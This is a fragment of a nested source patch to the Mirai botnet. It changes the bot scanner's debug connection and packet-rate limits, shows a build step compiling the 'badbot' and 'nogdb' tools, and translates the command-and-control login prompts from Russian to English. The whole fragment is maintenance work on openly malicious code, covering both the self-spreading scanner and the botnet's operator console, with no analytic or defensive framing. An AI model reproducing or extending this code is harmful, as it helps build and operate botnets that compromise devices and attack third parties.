@@ -63,6 +63,21 @@ index 615aa93..dfe53f0 100755
      return INET_ADDR(o1,o2,o3,o4);
  }
  
+diff --git a/mirai/bot/scanner.h b/mirai/bot/scanner.h
+index 3669463..a8d71d8 100755
+--- a/mirai/bot/scanner.h
++++ b/mirai/bot/scanner.h
+@@ -5,8 +5,8 @@
+ #include "includes.h"
+ 
+ #ifdef DEBUG
+-#define SCANNER_MAX_CONNS   128
+-#define SCANNER_RAW_PPS     160
++#define SCANNER_MAX_CONNS   16
++#define SCANNER_RAW_PPS     20
+ #else
+ #define SCANNER_MAX_CONNS   128
+ #define SCANNER_RAW_PPS     160
 diff --git a/mirai/bot/table.c b/mirai/bot/table.c
 index 13b341e..18ffc79 100755
 --- a/mirai/bot/table.c
@@ -102,7 +117,7 @@ index 51afd44..25720de 100755
      gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
      gcc -std=c99 tools/badbot.c -g -o debug/badbot
 diff --git a/mirai/cnc/admin.go b/mirai/cnc/admin.go
-index 28a2091..352af43 100755
+index 28a2091..4a7411a 100755
 --- a/mirai/cnc/admin.go
 +++ b/mirai/cnc/admin.go
 @@ -5,7 +5,6 @@ import (
@@ -129,7 +144,7 @@ index 28a2091..352af43 100755
      // Get username
      this.conn.SetDeadline(time.Now().Add(60 * time.Second))
 -    this.conn.Write([]byte("\033[34;1mпользователь\033[33;3m: \033[0m"))
-+    this.conn.Write([]byte("\033[34;1mUsername\033[33;3m: \033[0m"))
++    this.conn.Write([]byte("\033[34;1mUsername: \033[0m"))
      username, err := this.ReadLine(false)
      if err != nil {
          return
@@ -138,7 +153,7 @@ index 28a2091..352af43 100755
      // Get password
      this.conn.SetDeadline(time.Now().Add(60 * time.Second))
 -    this.conn.Write([]byte("\033[34;1mпароль\033[33;3m: \033[0m"))
-+    this.conn.Write([]byte("\033[34;1mPassword\033[33;3m: \033[0m"))
++    this.conn.Write([]byte("\033[34;1mPassword: \033[0m"))
      password, err := this.ReadLine(true)
      if err != nil {
          return
